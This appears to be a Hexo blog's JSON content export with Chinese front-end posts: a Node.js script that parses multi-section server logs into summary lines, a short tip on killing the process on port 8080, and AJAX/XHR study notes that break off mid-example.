{"meta":{"title":"一之碎片","subtitle":"「宠辱不惊 相由心生」","description":"前端 杂谈","author":"一之碎片","url":"https://avalooooooon.github.io","root":"/"},"pages":[{"title":"about","date":"2022-08-31T06:14:02.000Z","updated":"2022-08-31T06:14:02.130Z","comments":true,"path":"about/index.html","permalink":"https://avalooooooon.github.io/about/","excerpt":"","text":""}],"posts":[{"title":"node按行读取含分割线的多段log，提取重要信息并写入到另一文件输出","slug":"node按行读取含分割线的多段log，提取重要信息并写入到另一文件输出","date":"2022-11-17T06:24:23.000Z","updated":"2022-11-17T06:24:23.000Z","comments":true,"path":"2022/11/17/node按行读取含分割线的多段log，提取重要信息并写入到另一文件输出/","link":"","permalink":"https://avalooooooon.github.io/2022/11/17/node%E6%8C%89%E8%A1%8C%E8%AF%BB%E5%8F%96%E5%90%AB%E5%88%86%E5%89%B2%E7%BA%BF%E7%9A%84%E5%A4%9A%E6%AE%B5log%EF%BC%8C%E6%8F%90%E5%8F%96%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF%E5%B9%B6%E5%86%99%E5%85%A5%E5%88%B0%E5%8F%A6%E4%B8%80%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA/","excerpt":"给定一个.log文件，含多段log，每段中包含用户id等信息。从中提取id 时间 ip 响应码 api，项内通过,连接，项之间通过空格连接。时间也按形如2000-10-10 10:34:55的标准格式输出。在输出一整条完整信息之前不换行。","text":"给定一个.log文件，含多段log，每段中包含用户id等信息。从中提取id 时间 ip 响应码 api，项内通过,连接，项之间通过空格连接。时间也按形如2000-10-10 10:34:55的标准格式输出。在输出一整条完整信息之前不换行。 log文件origin.log文件。部分如下： 输出文件final.txt文件。部分输出如下： 代码analyze.js文件。整体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128// id 时间 ip 响应码 api FROM【xxx，】 const fs = require(&#x27;fs&#x27;)const readline = require(&#x27;readline&#x27;)const rs = fs.createReadStream(&#x27;origin.log&#x27;)const ws = fs.createWriteStream(&#x27;final.txt&#x27;)const rl = readline.createInterface(&#123; input: rs, terminal: false,&#125;)let reg = /^.*[/-]&#123;28,&#125;$/g // 正则：是否为分割行let totalLog = 0 // 计算log总数:通过计算分割线总数let section = &#123;&#125; // 存放每段loglet countPerLog = 0 // section中的item数量let tempJSONstr = &#x27;&#x27;// 将对象类型的section转化为 JSON string 并写入文件const sectionToString = function (section) &#123; section = JSON.stringify(section) return section&#125;// 获取idconst addId = function (obj) &#123; obj = JSON.parse(obj) let length = Object.keys(obj).length; let arr = obj[length - 1] // console.log(arr) let regID = new RegExp(&quot;(^|[&amp;?])&quot; + &#x27;user_id=&#x27; + &quot;([0-9]*)(.*|$)&quot;); if (arr.includes(&#x27;user_id&#x27;)) &#123; let strLine = arr.match(regID) idres = strLine[[2]] // return &quot;id:&quot; + idres return `$&#123;idres&#125;` &#125; else &#123; return `n` &#125;&#125;// 获取时间和ipconst addTimeIp = function (obj) &#123; obj = JSON.parse(obj) let arr = obj[0].split(&#x27; &#x27;) // arr是.log中的第一行 let length = arr.length let time = `20$&#123;arr[1].slice(0, 2)&#125;-$&#123;arr[1].slice(2, 4)&#125;-$&#123;arr[1].slice(4, 6)&#125; $&#123;arr[2]&#125;` // 访问时间 let ip = arr[length - 1] // 用户ip // let strLine = `时间:$&#123;time&#125; ip:$&#123;ip&#125;` let strLine = `$&#123;time&#125; $&#123;ip&#125;` return strLine&#125;// 获取响应码和apiconst addCodeApi = function (obj) &#123; obj = JSON.parse(obj) let strLine = &#x27;&#x27; let length = Object.keys(obj).length; let arr = obj[length - 1].split(&#x27; &#x27;) // arr是.log中的最后一行 let code = arr[4] let regApi = new RegExp(&quot;(^/.+)&quot; + &quot;(\\\\?)&quot; + &quot;(.*|$)&quot;); // console.log(arr[6]) let api = arr[6].match(regApi) if (!api) &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;arr[6]&#125;` strLine = `$&#123;code&#125; $&#123;arr[6]&#125;` &#125; else &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;api[1]&#125;` strLine = `$&#123;code&#125; $&#123;api[1]&#125;` &#125; return strLine&#125;// 获取访问的数据库const addDB = function (obj) &#123; obj = JSON.parse(obj) let DBSet = new Set() let length = Object.keys(obj).length; for (let i = 0; i &lt; length; i++) &#123; let arr = obj[i].split(&#x27; &#x27;) // arr是.log中的第i行 // console.log(arr) if (arr.includes(&#x27;FROM&#x27;)) &#123; let DBindex = arr.indexOf(&#x27;FROM&#x27;) + 1; // console.log(DBindex) DBSet.add(arr[DBindex]) // console.log(arr[DBindex]) &#125; &#125; if (!DBSet.size) &#123; // return &#x27;DB:n &#x27; return &#x27;n&#x27; &#125; else &#123; DBSet = [...DBSet].join(&#x27;,&#x27;) // return `DB:$&#123;DBSet&#125;` return `$&#123;DBSet&#125;` &#125;&#125;// 按行读原始log并以json形式存入tempJSONstrrl.on(&#x27;line&#x27;, line =&gt; &#123; if (!reg.test(line)) &#123; // 当前行不是&quot;...----&quot;的分割行 section[countPerLog] = line countPerLog++ &#125; else &#123; // 当前行是&quot;----&quot;分割行 totalLog++ if (JSON.stringify(section) !== &#x27;&#123;&#125;&#x27;) &#123; section = sectionToString(section) // console.log(section) tempJSONstr = tempJSONstr + section + &#x27;@&#x27; section = &#123;&#125; countPerLog = 0 &#125; // console.log(line, &quot;\\n&quot;) &#125;&#125;)// 由于最后一段log下没有分割线，在此处加入输出文件。rl.on(&#x27;close&#x27;, () =&gt; &#123; section = sectionToString(section) // console.log(section) tempJSONstr = tempJSONstr + section let obj = tempJSONstr.split(&#x27;@&#x27;) console.log(&#x27;readline close...&#x27;); console.log(&quot;@@@@@@@@@@@ totalLog:&quot; + totalLog) console.log(&quot;@@@@@@@@@@@@@@obj.length = &quot; + obj.length); for (let i = 0; i &lt; obj.length; i++) &#123; // if (obj[i].includes(id)) &#123; let resline = addId(obj[i]) resline = `$&#123;resline&#125; $&#123;addTimeIp(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addCodeApi(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addDB(obj[i])&#125;` ws.write(resline + &#x27;\\n&#x27;) &#125; // &#125;&#125;); 优化：处理含不同格式的log信息，如404 500异常log如下： analyze.js文件。整体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209// id 时间 ip 响应码 api FROM【xxx，】 const fs = require(&#x27;fs&#x27;)const readline = require(&#x27;readline&#x27;)const rs = fs.createReadStream(&#x27;./log/origin.log&#x27;)const ws = fs.createWriteStream(&#x27;./output/final.txt&#x27;)const rl = readline.createInterface(&#123; input: rs, terminal: false,&#125;)let reg = /^.*[/-]&#123;28,&#125;$/g // 正则：是否为分割行let totalLog = 0 // 计算log总数:通过计算分割线总数 + 404 + 500let section = &#123;&#125; // 存放每段loglet countPerLog = 0 // section中的item数量let tempJSONstr = &#x27;&#x27;// 将对象类型的section转化为 JSON string 并写入文件const sectionToString = function (section) &#123; section = JSON.stringify(section) return section&#125;// 获取idconst addId = function (obj) &#123; obj = JSON.parse(obj) let length = Object.keys(obj).length; let arr = obj[length - 1] // console.log(arr) let regID = new RegExp(&quot;(^|[&amp;?])&quot; + &#x27;user_id=&#x27; + &quot;([0-9]*)(.*|$)&quot;); if (arr.includes(&#x27;user_id&#x27;)) &#123; let strLine = arr.match(regID) idres = strLine[[2]] // return &quot;id:&quot; + idres return `$&#123;idres&#125;` &#125; else &#123; return `n` &#125;&#125;// 获取时间和ip(状态码正常)const addTimeIp = function (obj) &#123; obj = JSON.parse(obj) let arr = obj[0].split(&#x27; &#x27;) // arr是.log中的第一行 let length = arr.length let time = `20$&#123;arr[1].slice(0, 2)&#125;-$&#123;arr[1].slice(2, 4)&#125;-$&#123;arr[1].slice(4, 6)&#125; $&#123;arr[2]&#125;` // 访问时间 let ip = arr[length - 1] // 用户ip // let strLine = `时间:$&#123;time&#125; ip:$&#123;ip&#125;` let strLine = `$&#123;time&#125; $&#123;ip&#125;` return strLine&#125;// 获取时间和ip(状态码异常)const addTimeIpErr = function (obj) &#123; let arr = obj.split(&#x27; &#x27;) // arr是.log中的第一行 let time = `20$&#123;arr[1].slice(0, 2)&#125;-$&#123;arr[1].slice(2, 4)&#125;-$&#123;arr[1].slice(4, 6)&#125; $&#123;arr[2]&#125;` // 访问时间 let regIp = /\\((.+?)\\)/g let tempip = obj.match(regIp) // 带括号的用户ip let ip = tempip[0].substring(1, tempip[0].length - 1); // console.log(ip) // let strLine = `时间:$&#123;time&#125; ip:$&#123;ip&#125;` let strLine = `$&#123;time&#125; $&#123;ip&#125;` return strLine&#125;// 获取响应码和api(状态码正常)const addCodeApi = function (obj) &#123; obj = JSON.parse(obj) let strLine = &#x27;&#x27; let length = Object.keys(obj).length; let arr = obj[length - 1].split(&#x27; &#x27;) // arr是.log中的最后一行 let code = arr[4] let regApi = new RegExp(&quot;(^/.+)&quot; + &quot;(\\\\?)&quot; + &quot;(.*|$)&quot;); // console.log(arr[6]) let api = arr[6].match(regApi) if (!api) &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;arr[6]&#125;` strLine = `$&#123;code&#125; $&#123;arr[6]&#125;` &#125; else &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;api[1]&#125;` strLine = `$&#123;code&#125; $&#123;api[1]&#125;` &#125; return strLine&#125;// 获取响应码和api(状态码异常)const addCodeApiErr = function (obj) &#123; let strLine = &#x27;&#x27; let arr = obj.split(&#x27; &#x27;) // arr是.log中的第一行 let code = arr[4] let regApi = new RegExp(&quot;(^/.+)&quot; + &quot;(\\\\?)&quot; + &quot;(.*|$)&quot;); // console.log(arr[6]) let api = arr[6].match(regApi) if (!api) &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;arr[6]&#125;` strLine = `$&#123;code&#125; $&#123;arr[6]&#125;` &#125; else &#123; // strLine = `响应码:$&#123;code&#125; API:$&#123;api[1]&#125;` strLine = `$&#123;code&#125; $&#123;api[1]&#125;` &#125; return strLine&#125;// 获取访问的数据库const addDB = function (obj) &#123; obj = JSON.parse(obj) let DBSet = new Set() let length = Object.keys(obj).length; for (let i = 0; i &lt; length; i++) &#123; let arr = obj[i].split(&#x27; &#x27;) // arr是.log中的第i行 // console.log(arr) if (arr.includes(&#x27;FROM&#x27;)) &#123; let DBindex = arr.indexOf(&#x27;FROM&#x27;) + 1; // console.log(DBindex) DBSet.add(arr[DBindex]) // console.log(arr[DBindex]) &#125; &#125; if (!DBSet.size) &#123; // return &#x27;DB:n &#x27; return &#x27;n&#x27; &#125; else &#123; DBSet = [...DBSet].join(&#x27;,&#x27;) // return `DB:$&#123;DBSet&#125;` return `$&#123;DBSet&#125;` &#125;&#125;// 按行读原始log并以json形式存入tempJSONstrrl.on(&#x27;line&#x27;, line =&gt; &#123; // 不是重启行 if (line.includes(&#x27;my uuid&#x27;)) &#123; &#125; // 当前行不是&quot;...----&quot;的分割行 且状态码不是404或500 且不是出错后的描述行 else if (!reg.test(line) &amp;&amp; line[1] == &#x27;I&#x27;) &#123; section[countPerLog] = line countPerLog++ // 当前行状态码是404或500。情况有二，1:单独一群错误行 2:分割线里的正确行包着一群错误行 &#125; else if (!reg.test(line) &amp;&amp; line[1] != &#x27;I&#x27;) &#123; // 下面的if为了无视打印错误信息的几行 if (line.includes(&#x27; 404 &#x27;) || line.includes(&#x27; 500 &#x27;)) &#123; // 处理上一行是正确log &amp;&amp; 正确log和err分属两段log if (JSON.stringify(section) !== &#x27;&#123;&#125;&#x27; &amp;&amp; countPerLog != 1) &#123; totalLog++ section = sectionToString(section) tempJSONstr = tempJSONstr + section + &#x27;@&#x27; section = &#123;&#125; countPerLog = 0 tempJSONstr = tempJSONstr + line + &#x27;@&#x27; &#125; else if (JSON.stringify(section) !== &#x27;&#123;&#125;&#x27; &amp;&amp; countPerLog == 1) &#123; // 处理上一行是正确log &amp;&amp; 正确log和err同属一段log section[countPerLog] = line countPerLog++ section = sectionToString(section) tempJSONstr = tempJSONstr + section + &#x27;@&#x27; section = &#123;&#125; countPerLog = 0 &#125; else &#123; // 处理上一行是错误log 当前行和上一行按分属两段log处理 totalLog++ tempJSONstr = tempJSONstr + line + &#x27;@&#x27; &#125; &#125; &#125; else &#123; // 当前行是&quot;----&quot;分割行 totalLog++ if (JSON.stringify(section) !== &#x27;&#123;&#125;&#x27;) &#123; section = sectionToString(section) // console.log(section) tempJSONstr = tempJSONstr + section + &#x27;@&#x27; section = &#123;&#125; countPerLog = 0 &#125; &#125;&#125;)// 由于最后一段log下没有分割线，在此处加入输出文件。rl.on(&#x27;close&#x27;, () =&gt; &#123; if (JSON.stringify(section) !== &#x27;&#123;&#125;&#x27;) &#123; section = sectionToString(section) // console.log(section) tempJSONstr = tempJSONstr + section &#125; let obj = tempJSONstr.split(&#x27;@&#x27;) if (obj[obj.length - 1] == &#x27;&#x27;) &#123; obj.pop() &#125; console.log(obj) console.log(&#x27;readline close...&#x27;); console.log(&quot;@@@@@@@@@@@ totalLog:&quot; + totalLog) console.log(&quot;@@@@@@@@@@@@@@obj.length = &quot; + obj.length); for (let i = 0; i &lt; obj.length; i++) &#123; if (obj[i][1] == &#x27;E&#x27; || obj[i][1] == &#x27;W&#x27;) &#123; // 处理出错行 let resline = `n $&#123;addTimeIpErr(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addCodeApiErr(obj[i])&#125; n` ws.write(resline + &#x27;\\n&#x27;) &#125; else &#123; // 处理正确行 if (JSON.parse(obj[i])[1][1] == &#x27;E&#x27; || JSON.parse(obj[i])[1][1] == &#x27;W&#x27;) &#123; // 首行正确，下一行出现错误 obj[i] = JSON.parse(obj[i]) obj[i] = obj[i][1] let resline = `n $&#123;addTimeIpErr(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addCodeApiErr(obj[i])&#125; n` ws.write(resline + &#x27;\\n&#x27;) &#125; else &#123; let resline = addId(obj[i]) resline = `$&#123;resline&#125; $&#123;addTimeIp(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addCodeApi(obj[i])&#125;` resline = `$&#123;resline&#125; $&#123;addDB(obj[i])&#125;` ws.write(resline + &#x27;\\n&#x27;) &#125; &#125; &#125;&#125;);","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"端口进程","slug":"终端-端口进程","date":"2022-11-17T06:13:46.000Z","updated":"2022-11-17T06:13:46.000Z","comments":true,"path":"2022/11/17/终端-端口进程/","link":"","permalink":"https://avalooooooon.github.io/2022/11/17/%E7%BB%88%E7%AB%AF-%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"终端查看当前占用8080端口号的进程 查看进程id：sudo lsof -i :8080记住该进程的PID（进程ID），此处是PID为1689 杀死该进程：sudo kill -9 1689","categories":[{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/categories/shell/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://avalooooooon.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/tags/shell/"}]},{"title":"AJAX笔记-XHR使用-跨域-同源-jsonp-cors","slug":"AJAX笔记-XHR使用-跨域-同源-jsonp-cors","date":"2022-11-04T08:24:23.000Z","updated":"2022-11-04T08:24:23.000Z","comments":true,"path":"2022/11/04/AJAX笔记-XHR使用-跨域-同源-jsonp-cors/","link":"","permalink":"https://avalooooooon.github.io/2022/11/04/AJAX%E7%AC%94%E8%AE%B0-XHR%E4%BD%BF%E7%94%A8-%E8%B7%A8%E5%9F%9F-%E5%90%8C%E6%BA%90-jsonp-cors/","excerpt":"","text":"1. Ajax概述AJAX 简介AJAX 全称为Asynchronous JavaScript And XML，即异步的JS和XML。特点是可以在网页不刷新的情况下向服务端发送HTTP请求并得到HTTP响应。使用HTTP协议。通过AJAX 可以在浏览器中向服务器发送异步请求，最大优势： 无刷新 获取数据。AJAX 不是新的编程语言，而是一种将现有的标准组合在一起使用的新 方式 。 XML 简介 之前AJAX在进行数据交换时所使用的格式就是XML，服务端在向客户端返回结果时返回的就是一个XML格式的字符串；前端JS在接受到这个数据之后对这个内容进行解析，把数据提取出来并进行处理。现在已经被JSON取代了。JSON比XML更简洁，而且在数据转换中可以借助JSON的一些API方法快速将字符串转化为对象，灵活度远胜XML。 XML，即可扩展标记语言(HTML叫做超文本标记语言)。被设计用来传输和存储数据。和HTML 类似都是由标签组成的，不同的是HTML 中都是预定义标签，用于在网页当中呈现数据；而XML 中没有预定义标签，用来传输和存储数据。XML全都是 自定义标签 ，用来表示一些数据。 比如说有一个学生数据：name &#x3D; “孙悟空” ; age &#x3D; 18 ; gender &#x3D; “男” ;用XML 表示： 12345&lt;student&gt; &lt;name&gt;孙悟空&lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt;&lt;/student&gt; 用JSON表示： 1&#123;&quot;name&quot;:&quot;孙悟空&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;男&quot;&#125; AJAX 的优缺点 优点: 可以无需刷新页面而与服务器端进行通信 允许根据用户事件（鼠标&#x2F;键盘&#x2F;表单事件等）来更新部分页面内容 缺点: 没有浏览历史，不能回退 存在跨域问题(同源) 跨域：在一个服务（a.com）向另一个服务（b.com）发送AJAX请求，默认是不可以的。 SEO（搜索引擎优化）不友好 因为网页中的内容都是通过AJAX异步请求、动态创建的，爬虫爬不到。以购物网站为例，也就是源代码第一次请求时，响应体结果里是没有商品信息的。 区别：一般http请求 与 AJAX请求 AJAX请求是一种特别的 http请求 对服务器端来说, 没有任何区别, 区别在 浏览器端 。 浏览器端发请求: 只有 XHR 或 fetch 发出的才是AJAX请求， 其它所有的都是非AJAX请求。 浏览器端接收到响应 一般请求：浏览器一般会直接显示响应体数据，也就是我们常说的刷新&#x2F;跳转页面 ajax请求：浏览器不会对界面进行任何更新操作， 只是 调用监视的回调函数 并 传入响应相关数据 。 HTTP相关即 “hypertext transport protocol” ，【超文本传输协议】。详细规定了浏览器和万维网服务器之间互相通信的规则。 MDN文档 HTTP请求交互的基本过程 前台应用从浏览器端向服务器发送HTTP 请求(请求报文) 后台服务器接收到请求后，调度服务器应用处理请求，向浏览器端返回HTTP响应(响应报文) 浏览器端接收到响应，解析显示响应体&#x2F;调用监视回调 HTTP 请求报文：四部分12345678行 GET /s?ie=utf-8 HTTP/1.1头 Host: www.baidu.com Cookie: BAIDUID=AD3B0FA706E; BIDUPSID=AD3B0FA70 Content-Type: application/x-www-form-urlencoded User-Agent: chrome 83 [可选]空行 体 username=tom&amp;pwd=123 &#123;&quot;username&quot;: &quot;tom&quot;, &quot;pwd&quot;: 123&#125;(有时是这种形式) 重点是格式与参数 请求行：请求类型method url路径 HTTP协议版本各个参数放在url的部分。 多个请求头：格式都是 名字 冒号 空格 值 。 空行：必须得有 请求体：可以没有GET请求体就是空的，如果是POST可以不为空。 post 请求体参数格式 Content-Type: application/x-www-form-urlencoded;charset=utf-8用于键值对参数，参数的键值用&#x3D;连接, 参数之间用&amp;连接。例如: name=%E5%B0%8F%E6%98%8E&amp;age=12 Content-Type: application/json;charset=utf-8用于 json 字符串参数。例如: &#123;&quot;name&quot;: &quot;%E5%B0%8F%E6%98%8E&quot;, &quot;age&quot;: 12&#125; Content-Type: multipart/form-data用于文件上传请求。 不同类型的请求及其作用 GET: 从服务器端读取数据（查） POST: 向服务器端添加新数据 （增） PUT: 更新服务器端已经数据 （改） DELETE: 删除服务器端数据 （删） HTTP 响应报文：四部分1234567891011行 HTTP/1.1 200 OK头 Content-Type: text/html;charset=utf-8 Content-length: 2048 Content-encoding: gzip ...空行 体 &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;百度&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 响应行：HTTP协议版本 响应状态码 响应状态字符串响应状态字符串和响应状态码是对应的，不需要单独去设置。 多个请求头：格式都是 名字 冒号 空格 值 。和请求报文请求头一样。对响应体内容做一些相关描述，类型、长度、压缩方式等。 空行：必须得有 响应体：主要返回结果。实例中把html内容放在响应报文中传输，浏览器收到后会把响应体结果提取出来并对内容进行解析，在页面渲染。 常见的响应状态码200：OK 请求成功。一般用于GET 与POST 请求201：Created 已创建。成功请求并创建了新的资源401：Unauthorized 未授权&#x2F;请求要求用户的身份认证404：Not Found 服务器无法根据客户端的请求找到资源500：Internal Server Error 服务器内部错误，无法完成请求 事实上，响应状态码 2开头的“2xx”都表示成功！不止200是。 Chrome网络控制台查看通信报文Network标签页会列出当前网页在加载过程中所有发送的请求。点进一条，会展开新标签页。 标签Headers： Request headers点开后是请求头，可以看出都是名字冒号空格的格式，如果没显示请求行，点击view source即可显示请求行（方法+url+协议版本） Query String Parameters查询字符串参数，是对url（也就是请求行里的那个url）中的参数做解析，这一项在调试参数中很方便，可以方便的查看参数有没有成功发送。。 Response headers点开后是响应头，也是按照名字冒号空格的格式，点击view source即可显示原始的响应报文（只有响应行和响应头）。响应体在下面的和Headers同级的标签Response里。 Form Data：如果发送的是POST请求，点击view source显示的是原始的请求体内容。在我们点击提交按钮之后，浏览器会把原始的HTTP报文封装好，再发送给目标服务器的指定端口进行请求。 标签preview：是对响应的预览（解析） 标签Response：响应体。服务端返回的html内容。如果响应的结果是跳转则此处为空。 总之就是，看请求报文，就看标签Headers中的Request headers和Query String Parameters（有参数的GET请求）或Form Data（POST请求）；看响应报文就看标签Headers中的Response headers和标签Response 原生AJAX的基本使用：XHR，new XMLHttpRequest()node环境与express框架 安装node.js：nodejs官网 安装express（服务端框架）：express官网 初始化环境（记得是在根目录，目录最外边启动终端）：npm init --yes 下载express包：npm install express --save 在文件express基本使用中编写js代码：123456789101112131415161718 // 1. 引入express const express = require(&#x27;express&#x27;);// 2. 创建应用对象const app = express();// 3. 创建路由规则// request 是对请求报文的封装// response 是对响应报文的封装app.get(&#x27;/&#x27;, (request, response) =&gt; &#123; // 设置响应 response.send(&quot;Hello Express&quot;);&#125;);// 4. 监听端口，启动服务app.listen(8000, () =&gt; &#123; console.log(&quot;服务已经启动, 8000 端口监听中...&quot;);&#125;) 运行js程序：node express基本使用.js运行结果如下：打开网页127.0.0.1:8000，显示页面：打开NETWORK控制台，调试程序可以查看请求和响应。Headers标签页中的Request headers是我们刚才向8000端口发送的内容，Response headers是8000端口给我们的响应；Response标签页是响应体。这两块内容组合起来形成了完整的响应报文。 到此，这个HTTP服务就被启动起来了。接下来可以借助这个服务与前端的AJAX进行交互。 对XHR的理解使用XMLHttpRequest (XHR)对象可以与服务器交互，也就是发送ajax请求；前端可以获取到数据，而无需让整个的页面刷新。这使得Web 页面可以只更新页面的局部，而不影响用户的操作。https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest XMLHttpRequest ，AJAX 的所有操作都是通过该对象进行的。 核心对象使用步骤 创建XMLHttpRequest 对象：var xhr = new XMLHttpRequest() 在这个对象上使用 open 方法创建一个 HTTP 请求，并设置请求信息。open 方法所需要的参数是请求的方法、请求的地址、是否异步和用户的认证信息。12// 请求方式xhr.open(method, url); 在发起请求前，可以为这个对象添加一些信息和监听函数。比如说可以通过 setRequestHeader 方法来为请求添加头信息。还可以为这个对象添加一个状态监听函数。一个 XMLHttpRequest 对象一共有 5 个状态，当它的状态变化时会触发onreadystatechange 事件，可以通过设置监听函数，来处理请求成功后的结果。当对象的 readyState 变为 4 的时候，代表服务器返回的数据接收完成，这个时候可以通过判断请求的状态，如果状态是 2xx 或者 304 的话则代表返回正常。这个时候就可以通过 response 中的数据来对页面进行更新了。12//可以设置请求头，一般不设置xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;); 发送请求。当对象的属性和监听函数设置完成后，最后调用 sent 方法来向服务器发起请求，可以传入参数作为发送的数据体。xhr.send(body) //get请求不传 body 参数，只有post请求使用 接收响应（事件绑定，处理服务端返回的结果）123456789//xhr.responseXML 接收 xml格式 的响应数据//xhr.responseText 接收 文本格式 的响应数据xhr.onreadystatechange = function ()&#123; // readyState 是 xhr对象中的属性, 表示状态 0 1 2 3 4 if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; var text = xhr.responseText; console.log(text); &#125;&#125; 整体过程如下： 1234567891011121314151617181920212223const SERVER_URL = &quot;/server&quot;;let xhr = new XMLHttpRequest();// 创建 Http 请求xhr.open(&quot;GET&quot;, url, true);// 设置状态监听函数xhr.onreadystatechange = function() &#123; if (this.readyState !== 4) return; // 当请求成功时 if (this.status === 200) &#123; handle(this.response); &#125; else &#123; console.error(this.statusText); &#125;&#125;;// 设置请求失败时的监听函数xhr.onerror = function() &#123; console.error(this.statusText);&#125;;// 设置请求头信息xhr.responseType = &quot;json&quot;;xhr.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;);// 发送 Http 请求xhr.send(null); 使用Promise封装AJAX： 123456789101112131415161718192021222324252627282930// promise 封装实现：function getJSON(url) &#123; // 创建一个 promise 对象 let promise = new Promise(function(resolve, reject) &#123; let xhr = new XMLHttpRequest(); // 新建一个 http 请求 xhr.open(&quot;GET&quot;, url, true); // 设置状态的监听函数 xhr.onreadystatechange = function() &#123; if (this.readyState !== 4) return; // 当请求成功或失败时，改变 promise 的状态 if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125;; // 设置错误监听函数 xhr.onerror = function() &#123; reject(new Error(this.statusText)); &#125;; // 设置响应的数据类型 xhr.responseType = &quot;json&quot;; // 设置请求头信息 xhr.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;); // 发送 http 请求 xhr.send(null); &#125;); return promise;&#125; readystatereadyState 是 xhr 对象中的属性，表示状态 0 1 2 3 4。 0：未初始化。最开始的readyState状态就是0。 XMLHttpRequest对象创建完成，还没有调用open()方法。 1：open()方法调用完毕。 XMLHttpRequest对象初始化完成。已调用send()方法,正在发送请求。 2： send()方法调用完毕。 请求已经发送——send()方法完成,已经收到全部响应内容。 3： 服务端返回了部分结果。 服务器返回了数据（但是还没有被解析，可能只一段http报文）——正在解析响应内容。 4： 服务端返回了所有结果。 数据解析完成——响应内容解析完成,可以在客户端调用了。 案例——GET——AJAX请求发送前的准备：前端页面和服务端代码创建两个文件，浏览器端使用的html文件和服务器端使用的js文件。需要实现的需求是，点击按钮返回响应信息。点击按钮后向服务端发送一个请求，把服务端返回的 响应体结果 在紫色框呈现出来。html文件的基础代码如下： 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Ajax GET 请求&lt;/title&gt; &lt;style&gt; #result &#123; width: 200px; height: 100px; border: solid 1px #90b; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;button&gt;点击发送请求&lt;/button&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; server.js中的文件在上一部分的express代码基础上进行修改。把创建路由规则中的app.get()中的第一个参数改成/server，这样当客户端浏览器向服务器发送请求时，如果url的路径（也就是请求行的第二段内容）是/server的话，就会执行app.get()中的第二个参数也就是回调函数里面的代码，并且由(request, response)中的response来做出响应。整体代码如下： 123456789101112131415// 1. 引入expressconst express = require(&#x27;express&#x27;);// 2. 创建应用对象const app = express();// 3. 创建路由规则app.get(&#x27;/server&#x27;, (request, response) =&gt; &#123; // 设置响应头 设置允许跨域 response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;); // 设置响应体 response.send(&quot;Hello Ajax&quot;);&#125;);// 4. 监听服务app.listen(8000, () =&gt; &#123; console.log(&quot;服务已经启动, 8000 端口监听中...&quot;);&#125;) 准备好这两个文件后，在这两个文件所在的文件夹下打开控制台，输入node server.js启动服务。 如果想查看127.0.0.1:8000，记得要在后面加/server，和代码一致！！！即访问地址是http://127.0.0.1:8000/server。 接上节：完整的html和js代码点击按钮后的html页面：控制台中的输出： html文件如下。在上一节的基础上，只展示&lt;body&gt;内的代码： 1234567891011121314151617181920212223242526272829303132333435363738&lt;body&gt; &lt;button&gt;点击发送请求&lt;/button&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;script&gt; //获取button元素 getElementsByTagName返回数组的形式所以加0 const btn = document.getElementsByTagName(&#x27;button&#x27;)[0]; const result = document.getElementById(&#x27;result&#x27;); //绑定事件 btn.onclick = function () &#123; // 1. 创建对象 const xhr = new XMLHttpRequest(); // 2. 初始化 设置请求方法和url 此处url前面的部分不可省略 xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/server&#x27;) // 3. 发送 xhr.send(); // 4. 事件绑定 处理服务端返回的结果 xhr.onreadystatechange = function () &#123; // 判断 (服务端返回了所有的结果) if (xhr.readyState === 4) &#123; 